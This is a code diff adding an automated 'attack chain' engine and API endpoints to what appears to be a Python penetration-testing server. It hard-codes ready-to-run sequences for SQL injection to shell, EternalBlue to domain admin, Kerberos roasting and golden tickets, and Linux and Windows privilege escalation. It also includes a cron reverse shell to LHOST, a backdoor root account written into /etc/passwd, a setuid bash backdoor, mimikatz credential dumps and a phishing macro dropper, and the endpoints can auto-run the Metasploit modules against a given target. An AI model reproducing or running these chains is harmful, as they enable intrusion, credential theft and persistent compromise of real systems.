@@ -33,6 +33,300 @@ logger = logging.getLogger(__name__)
 scan_progress: Dict[str, Dict[str, Any]] = {}
 attack_trees: Dict[str, Dict[str, Any]] = {}
 active_connections: Dict[str, List[WebSocket]] = {}
+active_chains: Dict[str, Dict[str, Any]] = {}
+
+# =============================================================================
+# ATTACK CHAINS - AUTOMATED EXPLOITATION SEQUENCES
+# =============================================================================
+class AttackChainEngine:
+    """
+    Motor de cadenas de ataque automatizadas.
+    Ejecuta secuencias de exploits basadas en hallazgos.
+    """
+    
+    # Predefined attack chains
+    ATTACK_CHAINS = {
+        "web_to_shell": {
+            "name": "Web App to Shell",
+            "description": "SQLi/RCE → Credential Dump → Persistence",
+            "trigger": ["sql injection", "rce", "command injection"],
+            "steps": [
+                {
+                    "id": 1, "name": "Initial Exploitation",
+                    "actions": [
+                        {"tool": "sqlmap", "cmd": "sqlmap -u '{url}' --os-shell --batch", "condition": "sqli"},
+                        {"tool": "commix", "cmd": "commix -u '{url}' --os-cmd='id'", "condition": "cmdi"}
+                    ]
+                },
+                {
+                    "id": 2, "name": "Credential Harvesting",
+                    "actions": [
+                        {"tool": "sqlmap", "cmd": "sqlmap -u '{url}' --passwords --batch", "condition": "sqli"},
+                        {"cmd": "cat /etc/passwd; cat /etc/shadow 2>/dev/null", "condition": "shell"}
+                    ]
+                },
+                {
+                    "id": 3, "name": "Privilege Escalation Check",
+                    "actions": [
+                        {"tool": "linpeas", "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", "condition": "linux"},
+                        {"tool": "winpeas", "cmd": "winPEASx64.exe", "condition": "windows"}
+                    ]
+                },
+                {
+                    "id": 4, "name": "Establish Persistence",
+                    "actions": [
+                        {"cmd": "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/LHOST/4444 0>&1\"' | crontab -", "condition": "linux"},
+                        {"cmd": "schtasks /create /tn 'Update' /tr 'powershell -ep bypass -c IEX(...)' /sc minute", "condition": "windows"}
+                    ]
+                }
+            ]
+        },
+        "smb_to_domain": {
+            "name": "SMB to Domain Admin",
+            "description": "EternalBlue/Creds → Hashdump → Lateral → DC",
+            "trigger": ["smb", "445", "ms17-010"],
+            "steps": [
+                {
+                    "id": 1, "name": "SMB Exploitation",
+                    "actions": [
+                        {"tool": "metasploit", "module": "exploit/windows/smb/ms17_010_eternalblue", "condition": "ms17-010"},
+                        {"tool": "crackmapexec", "cmd": "crackmapexec smb {target} -u '' -p ''", "condition": "smb"}
+                    ]
+                },
+                {
+                    "id": 2, "name": "Credential Dump",
+                    "actions": [
+                        {"tool": "mimikatz", "cmd": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"},
+                        {"tool": "secretsdump", "cmd": "secretsdump.py {domain}/{user}:{pass}@{target}"}
+                    ]
+                },
+                {
+                    "id": 3, "name": "Lateral Movement",
+                    "actions": [
+                        {"tool": "psexec", "cmd": "psexec.py {domain}/{user}:{pass}@{next_target}"},
+                        {"tool": "wmiexec", "cmd": "wmiexec.py {domain}/{user}:{pass}@{next_target}"},
+                        {"tool": "crackmapexec", "cmd": "crackmapexec smb {subnet} -u {user} -p {pass} --sam"}
+                    ]
+                },
+                {
+                    "id": 4, "name": "Domain Controller Compromise",
+                    "actions": [
+                        {"tool": "secretsdump", "cmd": "secretsdump.py {domain}/{admin}:{pass}@{dc} -just-dc"},
+                        {"tool": "mimikatz", "cmd": "lsadump::dcsync /domain:{domain} /user:Administrator"}
+                    ]
+                }
+            ]
+        },
+        "kerberos_attack": {
+            "name": "Kerberos Attack Chain",
+            "description": "User Enum → AS-REP → Kerberoast → Golden Ticket",
+            "trigger": ["kerberos", "88", "active directory"],
+            "steps": [
+                {
+                    "id": 1, "name": "User Enumeration",
+                    "actions": [
+                        {"tool": "kerbrute", "cmd": "kerbrute userenum -d {domain} users.txt --dc {dc}"},
+                        {"tool": "crackmapexec", "cmd": "crackmapexec ldap {dc} -u '' -p '' --users"}
+                    ]
+                },
+                {
+                    "id": 2, "name": "AS-REP Roasting",
+                    "actions": [
+                        {"tool": "impacket", "cmd": "GetNPUsers.py {domain}/ -usersfile users.txt -no-pass -dc-ip {dc}"},
+                        {"tool": "rubeus", "cmd": "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"}
+                    ]
+                },
+                {
+                    "id": 3, "name": "Kerberoasting",
+                    "actions": [
+                        {"tool": "impacket", "cmd": "GetUserSPNs.py {domain}/{user}:{pass} -dc-ip {dc} -request"},
+                        {"tool": "rubeus", "cmd": "Rubeus.exe kerberoast /outfile:kerberoast.txt"}
+                    ]
+                },
+                {
+                    "id": 4, "name": "Crack Hashes",
+                    "actions": [
+                        {"tool": "hashcat", "cmd": "hashcat -m 18200 asrep.txt wordlist.txt"},
+                        {"tool": "hashcat", "cmd": "hashcat -m 13100 kerberoast.txt wordlist.txt"}
+                    ]
+                },
+                {
+                    "id": 5, "name": "Golden Ticket",
+                    "actions": [
+                        {"tool": "mimikatz", "cmd": "kerberos::golden /user:Administrator /domain:{domain} /sid:{sid} /krbtgt:{hash} /ptt"},
+                        {"tool": "impacket", "cmd": "ticketer.py -nthash {krbtgt_hash} -domain-sid {sid} -domain {domain} Administrator"}
+                    ]
+                }
+            ]
+        },
+        "linux_privesc": {
+            "name": "Linux Privilege Escalation",
+            "description": "Shell → Enum → Exploit → Root",
+            "trigger": ["linux", "shell", "ssh"],
+            "steps": [
+                {
+                    "id": 1, "name": "System Enumeration",
+                    "actions": [
+                        {"cmd": "uname -a; cat /etc/*release*"},
+                        {"cmd": "id; sudo -l 2>/dev/null"},
+                        {"tool": "linpeas", "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"}
+                    ]
+                },
+                {
+                    "id": 2, "name": "SUID/Capabilities Check",
+                    "actions": [
+                        {"cmd": "find / -perm -4000 -type f 2>/dev/null"},
+                        {"cmd": "getcap -r / 2>/dev/null"}
+                    ]
+                },
+                {
+                    "id": 3, "name": "Kernel Exploit",
+                    "actions": [
+                        {"tool": "linux-exploit-suggester", "cmd": "./linux-exploit-suggester.sh"},
+                        {"tool": "metasploit", "module": "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec", "condition": "polkit"},
+                        {"tool": "metasploit", "module": "exploit/linux/local/cve_2022_0847_dirtypipe", "condition": "kernel>=5.8"}
+                    ]
+                },
+                {
+                    "id": 4, "name": "Root Persistence",
+                    "actions": [
+                        {"cmd": "echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"},
+                        {"cmd": "cp /bin/bash /tmp/.backdoor; chmod +s /tmp/.backdoor"}
+                    ]
+                }
+            ]
+        },
+        "windows_privesc": {
+            "name": "Windows Privilege Escalation", 
+            "description": "Shell → Enum → Exploit → SYSTEM",
+            "trigger": ["windows", "shell", "rdp", "winrm"],
+            "steps": [
+                {
+                    "id": 1, "name": "System Enumeration",
+                    "actions": [
+                        {"cmd": "systeminfo"},
+                        {"cmd": "whoami /priv"},
+                        {"tool": "winpeas", "cmd": "winPEASx64.exe"}
+                    ]
+                },
+                {
+                    "id": 2, "name": "Service/Scheduled Task Abuse",
+                    "actions": [
+                        {"cmd": "sc qc vulnerable_service"},
+                        {"tool": "powerup", "cmd": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\""}
+                    ]
+                },
+                {
+                    "id": 3, "name": "Token Impersonation",
+                    "actions": [
+                        {"tool": "incognito", "cmd": "incognito.exe list_tokens -u"},
+                        {"tool": "metasploit", "module": "post/windows/manage/migrate"}
+                    ]
+                },
+                {
+                    "id": 4, "name": "Credential Extraction",
+                    "actions": [
+                        {"tool": "mimikatz", "cmd": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"},
+                        {"tool": "metasploit", "module": "post/windows/gather/hashdump"}
+                    ]
+                }
+            ]
+        },
+        "phishing_to_shell": {
+            "name": "Phishing to Internal Access",
+            "description": "Phish → Macro → Beacon → Pivot",
+            "trigger": ["phishing", "email", "social"],
+            "steps": [
+                {
+                    "id": 1, "name": "Payload Generation",
+                    "actions": [
+                        {"tool": "msfvenom", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT=443 -f exe > payload.exe"},
+                        {"tool": "macro_pack", "cmd": "echo 'payload' | macro_pack.py -t DROPPER -o mal.docm"}
+                    ]
+                },
+                {
+                    "id": 2, "name": "Delivery",
+                    "actions": [
+                        {"tool": "gophish", "cmd": "Launch phishing campaign with mal.docm attachment"},
+                        {"tool": "evilginx2", "cmd": "Setup credential harvesting proxy"}
+                    ]
+                },
+                {
+                    "id": 3, "name": "Initial Beacon",
+                    "actions": [
+                        {"tool": "metasploit", "cmd": "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https"},
+                        {"cmd": "Wait for callback from victim"}
+                    ]
+                },
+                {
+                    "id": 4, "name": "Internal Recon & Pivot",
+                    "actions": [
+                        {"cmd": "arp -a; netstat -an; ipconfig /all"},
+                        {"tool": "chisel", "cmd": "chisel server -p 8080 --reverse (on attack box)"},
+                        {"cmd": "chisel client LHOST:8080 R:socks"}
+                    ]
+                }
+            ]
+        }
+    }
+    
+    @classmethod
+    def get_applicable_chains(cls, findings: Dict) -> List[Dict]:
+        """Identify which attack chains apply based on findings"""
+        applicable = []
+        findings_text = json.dumps(findings).lower()
+        
+        for chain_id, chain in cls.ATTACK_CHAINS.items():
+            for trigger in chain["trigger"]:
+                if trigger.lower() in findings_text:
+                    applicable.append({
+                        "id": chain_id,
+                        "name": chain["name"],
+                        "description": chain["description"],
+                        "trigger_matched": trigger,
+                        "steps": chain["steps"],
+                        "total_steps": len(chain["steps"])
+                    })
+                    break
+        
+        return applicable
+    
+    @classmethod
+    def get_chain_details(cls, chain_id: str) -> Optional[Dict]:
+        """Get full details of an attack chain"""
+        return cls.ATTACK_CHAINS.get(chain_id)
+    
+    @classmethod
+    def generate_chain_commands(cls, chain_id: str, context: Dict) -> List[Dict]:
+        """Generate executable commands for a chain with context"""
+        chain = cls.ATTACK_CHAINS.get(chain_id)
+        if not chain:
+            return []
+        
+        commands = []
+        for step in chain["steps"]:
+            step_commands = []
+            for action in step["actions"]:
+                cmd = action.get("cmd", "")
+                # Replace placeholders
+                for key, value in context.items():
+                    cmd = cmd.replace(f"{{{key}}}", str(value))
+                
+                step_commands.append({
+                    "tool": action.get("tool", "shell"),
+                    "command": cmd,
+                    "module": action.get("module"),
+                    "condition": action.get("condition")
+                })
+            
+            commands.append({
+                "step_id": step["id"],
+                "step_name": step["name"],
+                "commands": step_commands
+            })
+        
+        return commands
+
 
 # =============================================================================
 # TACTICAL DECISION ENGINE - ADAPTIVE ATTACK PLANNING
@@ -873,6 +1167,172 @@ async def delete_scan(scan_id: str):
     scan_progress.pop(scan_id, None)
     attack_trees.pop(scan_id, None)
     return {"message": "Deleted"}
+
+# =============================================================================
+# ATTACK CHAINS API
+# =============================================================================
+@api_router.get("/chains")
+async def get_attack_chains():
+    """Get all available attack chains"""
+    chains = []
+    for chain_id, chain in AttackChainEngine.ATTACK_CHAINS.items():
+        chains.append({
+            "id": chain_id,
+            "name": chain["name"],
+            "description": chain["description"],
+            "triggers": chain["trigger"],
+            "steps_count": len(chain["steps"])
+        })
+    return {"chains": chains}
+
+@api_router.get("/chains/{chain_id}")
+async def get_chain_details(chain_id: str):
+    """Get full details of an attack chain"""
+    chain = AttackChainEngine.get_chain_details(chain_id)
+    if not chain:
+        raise HTTPException(status_code=404, detail="Chain not found")
+    return chain
+
+@api_router.post("/chains/{chain_id}/generate")
+async def generate_chain_commands(chain_id: str, context: Dict[str, Any]):
+    """Generate executable commands for a chain with context variables"""
+    commands = AttackChainEngine.generate_chain_commands(chain_id, context)
+    if not commands:
+        raise HTTPException(status_code=404, detail="Chain not found")
+    return {"chain_id": chain_id, "commands": commands}
+
+@api_router.post("/chains/detect")
+async def detect_applicable_chains(findings: Dict[str, Any]):
+    """Detect which attack chains apply based on scan findings"""
+    applicable = AttackChainEngine.get_applicable_chains(findings)
+    return {"applicable_chains": applicable, "count": len(applicable)}
+
+class ChainExecutionRequest(BaseModel):
+    scan_id: str
+    chain_id: str
+    target: str
+    context: Dict[str, str] = {}
+    auto_execute: bool = False
+
+@api_router.post("/chains/execute")
+async def execute_chain(request: ChainExecutionRequest, background_tasks: BackgroundTasks):
+    """Execute an attack chain (manual or auto)"""
+    chain = AttackChainEngine.get_chain_details(request.chain_id)
+    if not chain:
+        raise HTTPException(status_code=404, detail="Chain not found")
+    
+    execution_id = str(uuid.uuid4())
+    context = {"target": request.target, "lhost": request.context.get("lhost", ""), **request.context}
+    commands = AttackChainEngine.generate_chain_commands(request.chain_id, context)
+    
+    active_chains[execution_id] = {
+        "id": execution_id,
+        "scan_id": request.scan_id,
+        "chain_id": request.chain_id,
+        "chain_name": chain["name"],
+        "target": request.target,
+        "status": "ready",
+        "current_step": 0,
+        "total_steps": len(commands),
+        "commands": commands,
+        "results": [],
+        "created_at": datetime.now(timezone.utc).isoformat()
+    }
+    
+    # If auto_execute, run in background
+    if request.auto_execute:
+        active_chains[execution_id]["status"] = "running"
+        background_tasks.add_task(run_chain_background, execution_id)
+    
+    return {
+        "execution_id": execution_id,
+        "chain_id": request.chain_id,
+        "chain_name": chain["name"],
+        "status": active_chains[execution_id]["status"],
+        "commands": commands
+    }
+
+async def run_chain_background(execution_id: str):
+    """Background task to execute chain steps"""
+    chain_exec = active_chains.get(execution_id)
+    if not chain_exec:
+        return
+    
+    for i, step in enumerate(chain_exec["commands"]):
+        chain_exec["current_step"] = i + 1
+        step_results = {"step_id": step["step_id"], "step_name": step["step_name"], "command_results": []}
+        
+        for cmd in step["commands"]:
+            try:
+                if cmd.get("module"):
+                    # Metasploit module
+                    result = await run_metasploit(cmd["module"], chain_exec["target"], None, {}, chain_exec.get("lhost"), 4444)
+                else:
+                    # Shell command (simulated)
+                    result = {
+                        "command": cmd["command"],
+                        "simulated": True,
+                        "output": f"[SIMULATED] {cmd['command'][:100]}..."
+                    }
+                step_results["command_results"].append(result)
+            except Exception as e:
+                step_results["command_results"].append({"error": str(e)})
+        
+        chain_exec["results"].append(step_results)
+    
+    chain_exec["status"] = "completed"
+    
+    # Save to database
+    await db.chain_executions.insert_one({
+        "id": execution_id,
+        **chain_exec
+    })
+
+@api_router.get("/chains/execution/{execution_id}")
+async def get_chain_execution_status(execution_id: str):
+    """Get status of a chain execution"""
+    if execution_id in active_chains:
+        return active_chains[execution_id]
+    
+    exec_doc = await db.chain_executions.find_one({"id": execution_id}, {"_id": 0})
+    if exec_doc:
+        return exec_doc
+    
+    raise HTTPException(status_code=404, detail="Execution not found")
+
+@api_router.post("/chains/execution/{execution_id}/step/{step_id}")
+async def execute_chain_step(execution_id: str, step_id: int):
+    """Manually execute a specific step in a chain"""
+    chain_exec = active_chains.get(execution_id)
+    if not chain_exec:
+        raise HTTPException(status_code=404, detail="Execution not found")
+    
+    # Find the step
+    step = None
+    for s in chain_exec["commands"]:
+        if s["step_id"] == step_id:
+            step = s
+            break
+    
+    if not step:
+        raise HTTPException(status_code=404, detail="Step not found")
+    
+    step_results = {"step_id": step_id, "step_name": step["step_name"], "command_results": []}
+    
+    for cmd in step["commands"]:
+        try:
+            if cmd.get("module"):
+                result = await run_metasploit(cmd["module"], chain_exec["target"], None, {}, None, 4444)
+            else:
+                result = {"command": cmd["command"], "simulated": True, "output": f"[SIMULATED] {cmd['command'][:100]}..."}
+            step_results["command_results"].append(result)
+        except Exception as e:
+            step_results["command_results"].append({"error": str(e)})
+    
+    chain_exec["results"].append(step_results)
+    chain_exec["current_step"] = step_id
+    
+    return step_results
 
 app.include_router(api_router)
 app.add_middleware(CORSMiddleware, allow_credentials=True, allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','), allow_methods=["*"], allow_headers=["*"])
